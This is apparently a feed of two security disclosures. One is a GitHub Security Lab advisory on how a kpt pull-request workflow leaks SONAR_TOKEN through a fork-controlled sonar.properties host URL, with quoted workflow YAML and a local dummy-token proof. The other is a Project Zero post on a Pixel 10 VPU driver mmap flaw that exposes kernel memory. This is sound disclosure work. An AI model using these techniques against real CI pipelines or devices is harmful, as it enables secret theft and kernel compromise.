securitylab@github.com, please include a reference to GHSL-2026-207 in any communication regarding this issue.
items.title: GHSL-2026-207: External pull request branches can execute commands and steal SonarCloud credentials in kpt

items.summary: Coordinated Disclosure Timeline 2026-09-08: Reported through Private Vulnerability Reporting. 2026-09-30: Fixed in #4780 Summary The SonarCloud analysis workflow runs in the base repository through workflow_run, checks out an external pull request’s fork commit, and invokes SonarScanner with the repository’s SONAR_TOKEN. A fork author can set sonar.host.url in the checked-out sonar.properties; because the workflow does not pin a trusted scanner host, SonarScanner sends SONAR_TOKEN as Bearer authentication to that attacker-selected URL before analysis begins. The attacker can then exercise the token’s SonarCloud permissions and manipulate authenticated analysis for kptdev_kpt. Project kptdev/kpt repository Tested Version The default branch at commit 6345d96d661eae1f6cdcb97b1f70080ce35f61a4. Details Fork-controlled sonar.properties is consumed by a privileged SonarCloud scan with SONAR_TOKEN (GHSL-2026-208) The Go workflow runs for pull requests and checks out the pull request code for its build and test jobs. After successful testing, it uploads coverage reports and stores the pull request number in a PR_NUMBER artifact. Completion of the Go workflow triggers the default-branch SonarCloud analysis workflow. The latter runs in a privileged workflow_run context, where repository secrets are available. Its success and coverage-artifact checks restrict when the path runs, but do not establish trust in the pull request contents. For pull request runs, the privileged workflow downloads PR_NUMBER, resolves the pull request, and then checks out the triggering workflow’s head repository and head SHA. For an external pull request, both identify the fork author’s immutable commit: - name: Checkout PR head uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0 with: repository: ${{ github.event.workflow_run.head_repository.full_name }} ref: ${{ github.event.workflow_run.head_sha }} fetch-depth: 0 persist-credentials: false allow-unsafe-pr-checkout: true The next step is named Checkout base branch, but after briefly creating the local base branch it checks out HEAD_SHA again and resets the working tree to that commit: - name: Checkout base branch if: github.event.workflow_run.event == 'pull_request' env: BASE_REF: ${{ steps.pr_meta.outputs.base_ref }} HEAD_SHA: ${{ github.event.workflow_run.head_sha }} CLONE_URL: ${{ github.event.repository.clone_url }} run: | git remote add upstream "$CLONE_URL" git fetch upstream git checkout -B "$BASE_REF" "upstream/$BASE_REF" git checkout "$HEAD_SHA" git clean -ffdx && git reset --hard HEAD Consequently, files in the workspace, including sonar.properties, still come from the fork-controlled pull request commit. The SonarQube scan step then supplies the repository secret SONAR_TOKEN and explicitly selects that working-tree configuration file: - name: SonarQube Scan on PR if: github.event.workflow_run.event == 'pull_request' && hashFiles('PR_NUMBER.txt') != '' uses: SonarSource/sonarqube-scan-action@713881670b6b3676cda39549040e2d88c70d582e # v8.2.0 env: SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }} with: args: -Dsonar.projectKey=kptdev_kpt -Dsonar.organization=kptdev -Dproject.settings=sonar.properties -Dsonar.pullrequest.key=${{ steps.pr_meta.outputs.number }} -Dsonar.pullrequest.branch=${{ steps.pr_meta.outputs.head_ref }} -Dsonar.pullrequest.base=${{ steps.pr_meta.outputs.base_ref }} The command-line arguments pin several analysis identifiers, but they do not pin sonar.host.url. SonarScanner CLI loads the project settings file before overlaying environment variables and CLI arguments. In this workflow, SONAR_TOKEN maps to sonar.token, but neither the workflow nor the action sets a trusted SONAR_HOST_URL. The pull request’s sonar.host.url therefore remains effective. The scanner’s HTTP client adds Authorization: Bearer <sonar.token> to authenticated bootstrap requests sent to that configured host. This was reproduced safely with the exact SonarScanner CLI 8.1.0.6389 selected by the pinned action. A local-only listener and dummy token were used; no project credential or external receiver was involved. The controlled project file contained: sonar.host.url=http://127.0.0.1:<port> sonar.projectKey=ghsl-local-proof sonar.sources=. The scanner was launched in a clean environment with: env -i PATH="$PATH" SONAR_TOKEN=GHSL_DUMMY_CANARY_2026_208 sonar-scanner -Dproject.settings=sonar.properties Before analysis began, the listener received: GET /api/v2/analysis/version HTTP/1.1 Authorization: Bearer GHSL_DUMMY_CANARY_2026_208 User-Agent: ScannerCLI/8.1.0.6389 The scanner also sent the same Bearer token to its legacy /api/server/version fallback after the local listener returned an unsupported response. This demonstrates that an attacker does not need a functioning SonarQube server or a completed scan to obtain the secret: receiving the initial authenticated bootstrap request is sufficient. No live exploit was run against the project, and this report does not claim base-repository writes. A representative attack sequence is: An external contributor changes sonar.properties in a fork and opens a pull request containing code changes that exercise the Go workflow. The pull request workflow completes successfully and uploads the expected coverage and PR_NUMBER artifacts. Repository policy may first require approval for the fork workflow run. The workflow_run job checks out the fork repository at the attacker-controlled head SHA. The branch-preparation commands finish with the same untrusted head SHA checked out, so they do not restore the trusted base version of sonar.properties. SonarScanner reads the attacker-controlled sonar.host.url and sends SONAR_TOKEN as Bearer authentication to that server during its initial bootstrap request, directly disclosing the repository secret. Impact This is a confirmed direct disclosure of SONAR_TOKEN across the pull request trust boundary. An external fork author can choose the scanner’s destination through sonar.properties; the exact scanner used by the workflow then transmits the repository secret to that destination in an Authorization: Bearer header before analysis begins. After disclosure, the attacker can exercise whatever permissions the token carries. A SonarCloud personal access token can authenticate analyses and Web API requests with the issuing user’s permissions. A scoped organization or project analysis token can at least submit unauthorized analyses within its scope. In either case, the attacker can impersonate the trusted CI scanner, consume or corrupt authenticated analysis for kptdev_kpt, and undermine the integrity of its security and quality results. The exact blast radius beyond that project depends on the type and permissions of the configured token. The minimum attacker requires only control of an external pull request’s contents. Exploitation requires the Go workflow to run successfully. CWEs CWE-829: Inclusion of Functionality from Untrusted Control Sphere Resources Go pull request workflow and artifact producer SonarCloud analysis privileged consumer workflow sonar.properties at the tested commit GitHub Security Lab: Preventing pwn requests GitHub Docs: Mitigating the risks of untrusted code checkout Credit This issue was discovered and reported by GHSL team member @JarLob (Jaroslav Lobačevski). Contact You can contact the GHSL team at securitylab@github.com, please include a reference to GHSL-2026-208 in any communication regarding this issue.

items.summary: We recently published an exploit chain for the Google Pixel 9 that demonstrated it was possible to go from a zero-click context to root on Android in just two exploits. The Dolby 0-click vulnerability existed across all of Android, until it was patched in January 2026. While we had an exploit chain for the Pixel 9, we wanted to see if it was possible to write a similar exploit chain for Pixel 10. Updating the Dolby Exploit Altering our exploit for CVE-2025-54957 was fairly straightforward. The majority of needed changes involved updating offsets calculated for the specific version of the library we targeted on the Pixel 9 to similar offsets in the library for Pixel 10. The only challenge (outside of wishing we’d better documented which syncframes contained offsets) was that the Pixel 10 uses RET PAC in the place of -fstack-protector, which meant that __stack_chk_fail wasn’t available to be overwritten by code. After a bit of trial and error, we used dap_cpdp_init, initialization code that can be overwritten without causing functional problems, as it is called once when the decoder is initialized and never again. The updated Dolby UDC exploit is available here. This exploit will only work on unpatched devices (SPL December 2025 or earlier). Removal of BigWave, Addition of VPU Porting the local privilege escalation link of the chain to Pixel 10 was not feasible as the BigWave driver does not ship on this device. However, a new driver is visible in the mediacodec SELinux context at /dev/vpu. This driver is used for interacting with the Chips&Media Wave677DV silicon on the Tensor G5 chip meant for accelerating video decoding. Based on the comments within the open-source C files, this driver is developed and maintained by the same set of developers who built the BigWave driver. Working in collaboration with Jann Horn, we spent 2 hours auditing this VPU driver and discovered an exceptional vulnerability. Unlike the upstream Linux driver for WAVE521C (which is an older Chips&Media chip), the Pixel driver for WAVE677DV does not integrate with V4L2 (the “Video for Linux API”); instead, it directly exposes the chip’s hardware interface to userspace, including letting userspace map the chip’s MMIO register interface. The driver mainly establishes device memory mappings, does power management, and allows userspace to wait for interrupts from the chip. The Holy Grail of Kernel Vulnerabilities This bug in particular caught our attention as exceptionally simple to exploit: static int vpu_mmap(struct file *fp, struct vm_area_struct *vm) { unsigned long pfn; struct vpu_core *core = container_of(fp->f_inode->i_cdev, struct vpu_core, cdev); vm_flags_set(vm, VM_IO | VM_DONTEXPAND | VM_DONTDUMP); /* This is a CSRs mapping, use pgprot_device */ vm->vm_page_prot = pgprot_device(vm->vm_page_prot); pfn = core->paddr >> PAGE_SHIFT; return remap_pfn_range(vm, vm->vm_start, pfn, vm->vm_end-vm->vm_start, vm->vm_page_prot) ? -EAGAIN : 0; } This mmap handler is intended to be used in order to map the MMIO register region of the VPU hardware into the userland virtual address space - a region contained within a certain physical memory address range. In doing so, it makes a call to remap_pfn_range based purely on the size of the VMA and not at all bounded to the size of this register region. This means that, by specifying a size larger than the register region in an mmap syscall, the caller can map as much physical memory as they want into userland, starting at the physical address of the VPU register region. The entirety of the kernel image (including .text, and .data region) is located at a higher physical address than the VPU register region, and can therefore be accessed and modified by userspace with this bug. At this point, one can simply overwrite any kernel function to gain kernel code execution - or indeed any primitive one might desire. This is rendered even easier by the fact that the kernel is always at the same physical address on Pixel and so the offset between the VPU memory region and the kernel is always a known value. Thus it is not even necessary to scan for the kernel in the mapped physical memory - you simply know exactly where it is relative to the address returned by mmap, presuming you make the VMA length large enough. Achieving arbitrary read-write on the kernel with this vulnerability required 5 lines of code and writing a full exploit for this issue required less than a day of effort. Patch Process I reported this bug on November 24, 2025 and Android VRP rated the issue High severity. This is an improvement, given that the BigWave bug we used for privilege escalation on the Pixel 9 (which had identical security impact) was initially rated as Moderate severity. This represents a meaningful and positive change in posture regarding how these types of bugs are triaged and patched. The vulnerability was patched 71 days after its initial report, in the February Pixel security bulletin. This is notably fast given that this is the first time that an Android driver bug I reported was patched within 90 days of the vendor first learning about the vulnerability. Conclusion There are both positives and negatives to take from this research. A key goal of Project Zero is to drive systemic improvements that go beyond individual bug fixes, influencing better development processes and more resilient codebases that lead to improvements in security for end-users. The handling of this VPU vulnerability demonstrates clear progress in Android’s triage pipeline, as this bug had an initial remediation in a much shorter period of time than the previous BigWave issues. Android’s effort to ensure that serious vulnerabilities are patched efficiently will help protect many Android devices. At the same time, this case underscores the ongoing need for more exhaustively robust and security-aware code in Android drivers. When I reported the bugs in BigWave, I hoped to spur its developers to evaluate their other drivers for obvious security issues, but 5 months later we nevertheless found a serious and extremely shallow vulnerability in their VPU driver that was instantly noticeable with even a cursory audit of the codebase. Strengthening driver security remains a crucial priority for ensuring a safe Android ecosystem, and we continue to strongly encourage vendors to improve software development practices in a proactive effort to prevent these sorts of vulnerabilities from ever reaching end-users. Security reports often uncover complex issues missed by the product teams but it is important that software vendors take necessary steps to ensure software products, especially security-critical ones, launch in a reasonably vulnerability-free state and that software teams take a proactive approach to software security, code auditing, and vulnerability patching.
